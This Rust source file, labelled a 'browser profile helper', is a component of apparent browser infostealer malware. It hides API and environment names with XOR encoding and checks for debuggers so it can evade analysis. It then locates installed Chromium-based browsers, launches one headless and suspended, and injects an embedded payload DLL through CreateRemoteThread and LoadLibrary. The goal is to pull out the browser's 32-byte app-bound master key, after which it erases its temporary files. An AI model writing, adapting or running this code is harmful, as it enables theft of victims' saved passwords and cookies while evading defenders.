//! Host-side browser profile helper (in-process module loader).

mod browsers;

use std::{
    env,
    ffi::OsStr,
    fs,
    mem,
    os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use serde_json::Value;
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::{
                Debug::{IsDebuggerPresent, WriteProcessMemory},
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                    TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, CreateRemoteThread, GetCurrentProcess, GetExitCodeThread, OpenProcess,
                QueryFullProcessImageNameW, ResumeThread, TerminateProcess, WaitForSingleObject,
                INFINITE, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW,
                STARTUPINFOW_FLAGS,
            },
        },
    },
};

const OBF_KEY: u8 = 0xA7;

const ENC_K32: &[u8] = &[0xcc, 0xc2, 0xd5, 0xc9, 0xc2, 0xcb, 0x94, 0x95, 0x89, 0xc3, 0xcb, 0xcb];
const ENC_LOAD_LIB: &[u8] = &[0xeb, 0xc8, 0xc6, 0xc3, 0xeb, 0xce, 0xc5, 0xd5, 0xc6, 0xd5, 0xde, 0xf0];
const ENC_NTDLL: &[u8] = &[0xc9, 0xd3, 0xc3, 0xcb, 0xcb, 0x89, 0xc3, 0xcb, 0xcb];
const ENC_NT_QUERY: &[u8] = &[
    0xe9, 0xd3, 0xf6, 0xd2, 0xc2, 0xd5, 0xde, 0xee, 0xc9, 0xc1, 0xc8, 0xd5, 0xca, 0xc6, 0xd3, 0xce,
    0xc8, 0xc9, 0xf7, 0xd5, 0xc8, 0xc4, 0xc2, 0xd4, 0xd4,
];
const ENC_ENV_RESULT: &[u8] = &[
    0xe4, 0xef, 0xf5, 0xe8, 0xea, 0xe2, 0xf8, 0xf5, 0xe2, 0xe4, 0xe8, 0xf1, 0xe2, 0xf5, 0xfe, 0xf8,
    0xf5, 0xe2, 0xf4, 0xf2, 0xeb, 0xf3,
];
const ENC_ENV_USER_DATA: &[u8] = &[
    0xe4, 0xef, 0xf5, 0xe8, 0xea, 0xe2, 0xf8, 0xf5, 0xe2, 0xe4, 0xe8, 0xf1, 0xe2, 0xf5, 0xfe, 0xf8,
    0xf2, 0xf4, 0xe2, 0xf5, 0xf8, 0xe3, 0xe6, 0xf3, 0xe6, 0xf8, 0xf5, 0xe2, 0xeb,
];
const ENC_ENV_DATA_ROOT: &[u8] = &[
    0xe4, 0xef, 0xf5, 0xe8, 0xea, 0xe2, 0xf8, 0xf5, 0xe2, 0xe4, 0xe8, 0xf1, 0xe2, 0xf5, 0xfe, 0xf8,
    0xe3, 0xe6, 0xf3, 0xe6, 0xf8, 0xf5, 0xe8, 0xe8, 0xf3,
];
const ENC_ENV_BROWSER: &[u8] = &[
    0xe4, 0xef, 0xf5, 0xe8, 0xea, 0xe2, 0xf8, 0xf5, 0xe2, 0xe4, 0xe8, 0xf1, 0xe2, 0xf5, 0xfe, 0xf8,
    0xe5, 0xf5, 0xe8, 0xf0, 0xf4, 0xe2, 0xf5, 0xf8, 0xe9, 0xe6, 0xea, 0xe2,
];
const ENC_FALLBACK_JSON: &[u8] = &[
    0xc4, 0xcf, 0xd5, 0xc8, 0xca, 0xc2, 0xf8, 0xd5, 0xc2, 0xc4, 0xc8, 0xd1, 0xc2, 0xd5, 0xde, 0xf8,
    0xd5, 0xc2, 0xd4, 0xd2, 0xcb, 0xd3, 0x89, 0xcd, 0xd4, 0xc8, 0xc9,
];
const ENC_NUL_DEV: &[u8] = &[0xe9, 0xf2, 0xeb];

const PROC_DEBUG_PORT: u32 = 7;
const PROC_DEBUG_FLAGS: u32 = 31;

fn decode(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ OBF_KEY) as char).collect()
}

fn decode_cstr(enc: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = enc.iter().map(|&b| b ^ OBF_KEY).collect();
    out.push(0);
    out
}

fn env_key_result() -> String {
    decode(ENC_ENV_RESULT)
}

fn env_key_user_data() -> String {
    decode(ENC_ENV_USER_DATA)
}

fn env_key_data_root() -> String {
    decode(ENC_ENV_DATA_ROOT)
}

fn env_key_browser() -> String {
    decode(ENC_ENV_BROWSER)
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
    min + (seed % (span + 1))
}

fn pause_ms(min: u64, max: u64) {
    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
}

fn secure_zero(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        *byte = 0;
    }
}

fn secure_zero_wide(buf: &mut [u16]) {
    for item in buf.iter_mut() {
        *item = 0;
    }
}

type NtQueryInformationProcessFn = unsafe extern "system" fn(
    HANDLE,
    u32,
    *mut std::ffi::c_void,
    u32,
    *mut u32,
) -> i32;

fn resolve_export(module_enc: &[u8], export_enc: &[u8]) -> Option<usize> {
    unsafe {
        let module = decode(module_enc);
        let module_wide: Vec<u16> = OsStr::new(&module)
            .encode_wide()
            .chain(Some(0))
            .collect();
        let handle = GetModuleHandleW(PCWSTR(module_wide.as_ptr())).ok()?;
        let export = decode_cstr(export_enc);
        GetProcAddress(handle, PCSTR(export.as_ptr())).map(|p| p as usize)
    }
}

fn host_under_analysis() -> bool {
    unsafe {
        if IsDebuggerPresent().as_bool() {
            return true;
        }

        let Some(query) = resolve_export(ENC_NTDLL, ENC_NT_QUERY) else {
            return false;
        };
        let query_fn: NtQueryInformationProcessFn = mem::transmute(query);
        let proc = GetCurrentProcess();

        let mut debug_port: usize = 0;
        if query_fn(
            proc,
            PROC_DEBUG_PORT,
            &mut debug_port as *mut _ as *mut _,
            mem::size_of::<usize>() as u32,
            std::ptr::null_mut(),
        ) >= 0
            && debug_port != 0
        {
            return true;
        }

        let mut debug_flags: u32 = 0;
        if query_fn(
            proc,
            PROC_DEBUG_FLAGS,
            &mut debug_flags as *mut _ as *mut _,
            mem::size_of::<u32>() as u32,
            std::ptr::null_mut(),
        ) >= 0
            && debug_flags == 0
        {
            return true;
        }
    }
    false
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn ctx_id() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct TempGuard {
    files: Vec<PathBuf>,
    dirs: Vec<PathBuf>,
    spawned_pid: Option<u32>,
    env_keys: Vec<String>,
}

impl TempGuard {
    fn new() -> Self {
        Self {
            files: Vec::new(),
            dirs: Vec::new(),
            spawned_pid: None,
            env_keys: Vec::new(),
        }
    }

    fn track_file(&mut self, path: PathBuf) {
        self.files.push(path);
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }

    fn track_env(&mut self, key: String) {
        self.env_keys.push(key);
    }
}

impl Drop for TempGuard {
    fn drop(&mut self) {
        pause_ms(80, 420);

        if let Some(pid) = self.spawned_pid.take() {
            unsafe {
                if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                    TerminateProcess(proc, 0).ok();
                    CloseHandle(proc).ok();
                }
            }
        }

        pause_ms(40, 220);

        for path in &self.files {
            let _ = fs::remove_file(path);
            pause_ms(15, 85);
        }
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
            pause_ms(20, 95);
        }
        for key in &self.env_keys {
            let _ = env::remove_var(key);
        }
    }
}

fn enum_proc_ids(target_exe: &str) -> Vec<u32> {
    pause_ms(10, 60);
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

fn proc_image_path(pid: u32) -> Option<String> {
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        CloseHandle(proc).ok();
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

fn reg_app_path(exe_name: &str) -> Option<PathBuf> {
    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn add_candidate(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

fn scan_install_paths(target_exe: &str, browser_name: &str) -> Option<String> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = reg_app_path(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"));
            }
            "Chrome Dev" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"));
            }
            "Chrome Canary" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"));
            }
            "Chromium" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"));
            }
            "CentBrowser" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
            }
            "Edge Dev" => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"));
            }
        },
        "brave.exe" => match browser_name {
            "Brave Beta" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
            }
            "Brave Nightly" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                add_candidate(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
            }
        },
        "vivaldi.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe"));
            add_candidate(&mut candidates, PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe"));
        }
        "opera.exe" => match browser_name {
            "OperaGX" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera GX\\opera.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Opera GX\\opera.exe"));
            }
            "Opera Neon" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera Neon\\opera.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Programs\\Opera\\opera.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Opera\\opera.exe"));
            }
        },
        "browser.exe" => match browser_name {
            "CocCoc" => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("CocCoc\\Browser\\Application\\browser.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("CocCoc\\Browser\\Application\\browser.exe"));
            }
            _ => {
                add_candidate(&mut candidates, PathBuf::from(&local).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
                add_candidate(&mut candidates, PathBuf::from(&pf).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
            }
        },
        "360chrome.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&pf).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
            add_candidate(&mut candidates, PathBuf::from(&local).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
        }
        "epic.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Epic Privacy Browser\\Application\\epic.exe"));
        }
        "uran.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("uCozMedia\\Uran\\Application\\uran.exe"));
        }
        "7star.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("7Star\\7Star\\Application\\7star.exe"));
        }
        "torch.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Torch\\Application\\torch.exe"));
        }
        "kometa.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Kometa\\Application\\kometa.exe"));
        }
        "orbitum.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Orbitum\\Application\\orbitum.exe"));
        }
        "amigo.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Amigo\\Application\\amigo.exe"));
        }
        "sputnik.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Sputnik\\Sputnik\\Application\\sputnik.exe"));
        }
        "slimjet.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Slimjet\\Application\\slimjet.exe"));
            add_candidate(&mut candidates, PathBuf::from(&pf).join("Slimjet\\slimjet.exe"));
        }
        "iridium.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Iridium\\Application\\iridium.exe"));
        }
        "thorium.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("Thorium\\Application\\thorium.exe"));
        }
        "Arc.exe" => {
            add_candidate(&mut candidates, PathBuf::from(&local).join("The Browser Company\\Arc\\Application\\Arc.exe"));
        }
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    enum_proc_ids(target_exe)
        .iter()
        .find_map(|&pid| proc_image_path(pid))
        .or_else(|| scan_install_paths(target_exe, browser_name))
}

fn attach_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
    pause_ms(35, 180);

    let dll_str = dll_path.to_string_lossy();
    let mut dll_wide = to_wide(&dll_str);
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false,
            pid,
        )
        .map_err(|_| ())?;

        pause_ms(20, 90);

        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            secure_zero_wide(dll_wide.as_mut_slice());
            return Err(());
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            proc,
            remote,
            dll_wide.as_ptr() as *const _,
            dll_bytes,
            Some(&mut written),
        )
        .is_err()
        {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            secure_zero_wide(dll_wide.as_mut_slice());
            return Err(());
        }

        secure_zero_wide(dll_wide.as_mut_slice());

        let loadlib = resolve_export(ENC_K32, ENC_LOAD_LIB).ok_or(())?;
        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = mem::transmute(loadlib);

        pause_ms(25, 110);

        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None)
            .map_err(|_| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
            })?;

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err(());
        }
    }
    Ok(())
}

fn launch_host(chrome_exe: &str, dll_path: &Path, profile_dir: &Path) -> Result<u32, ()> {
    pause_ms(50, 200);

    let profile_str = profile_dir.to_string_lossy();
    let cmdline = format!(
        "\"{chrome_exe}\" --headless=new --disable-gpu \
         --disable-logging --log-level=3 --silent-debug-dump \
         --disable-background-networking --disable-sync --disable-default-apps \
         --disable-features=PushMessaging,NotificationTriggers \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --noerrdialogs \
         --user-data-dir=\"{profile_str}\""
    );

    let exe_w = to_wide(chrome_exe);
    let mut cmd_w = to_wide(&cmdline);

    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;

    unsafe {
        let nul_name = decode(ENC_NUL_DEV);
        let nul_wide = to_wide(&nul_name);
        let nul = CreateFileW(
            PCWSTR(nul_wide.as_ptr()),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|_| ())?;

        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        pause_ms(30, 120);

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            true,
            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|_| {
            let _ = CloseHandle(nul);
        })?;

        CloseHandle(nul).ok();
        let pid = pi.dwProcessId;

        match attach_module(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(()) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(())
            }
        }
    }
}

fn parse_hex32(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn read_output(path: &Path) -> Option<Vec<u8>> {
    let raw = fs::read_to_string(path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    if json.get("error").and_then(|e| e.as_str()).is_some() {
        return None;
    }
    let hex = json.get("master_key_hex")?.as_str()?;
    parse_hex32(hex)
}

/// Extract embedded payload to temp, inject silently, return 32-byte app-bound key.
pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    if payload_dll.is_empty() || host_under_analysis() {
        return None;
    }

    pause_ms(60, 240);

    let target = browsers::find_target(browser_name)?;
    let exe = target.exe;
    let browser_exe = resolve_exe(exe, browser_name)?;

    pause_ms(40, 160);

    let tag = ctx_id();
    let temp = env::temp_dir();
    let dll_path = temp.join(format!("{tag}.tmp"));
    let result_path = temp.join(format!("{tag}.json"));
    let profile_dir = temp.join(format!("{tag}_p"));

    let mut guard = TempGuard::new();
    guard.track_file(dll_path.clone());
    guard.track_file(result_path.clone());
    guard.track_dir(profile_dir.clone());

    let mut payload_buf = payload_dll.to_vec();
    fs::write(&dll_path, &payload_buf).ok()?;
    secure_zero(&mut payload_buf);

    let result_key = env_key_result();
    let user_data_key = env_key_user_data();
    let data_root_key = env_key_data_root();
    let browser_key = env_key_browser();

    env::set_var(&result_key, &result_path);
    env::set_var(&user_data_key, target.user_data_rel);
    env::set_var(
        &data_root_key,
        match target.root {
            browsers::DataRoot::Local => "local",
            browsers::DataRoot::Roaming => "roaming",
        },
    );
    env::set_var(&browser_key, browser_name);

    guard.track_env(result_key);
    guard.track_env(user_data_key);
    guard.track_env(data_root_key);
    guard.track_env(browser_key);

    pause_ms(45, 175);

    let injected = if let Ok(pid) = launch_host(&browser_exe, &dll_path, &profile_dir) {
        guard.spawned_pid = Some(pid);
        true
    } else {
        let mut ok = false;
        for pid in enum_proc_ids(exe) {
            pause_ms(20, 80);
            if attach_module(pid, &dll_path).is_ok() {
                ok = true;
                break;
            }
        }
        ok
    };

    if !injected {
        return None;
    }

    for i in 0..24 {
        if result_path.exists() {
            if let Some(key) = read_output(&result_path) {
                if key.len() == 32 {
                    return Some(key);
                }
            }
        }
        let fallback = env::temp_dir().join(decode(ENC_FALLBACK_JSON));
        if fallback.exists() {
            if let Some(key) = read_output(&fallback) {
                if key.len() == 32 {
                    guard.track_file(fallback);
                    return Some(key);
                }
            }
        }
        let delay = jitter_ms(if i < 8 { 160 } else { 320 }, if i < 8 { 280 } else { 520 });
        thread::sleep(Duration::from_millis(delay));
    }

    None
}
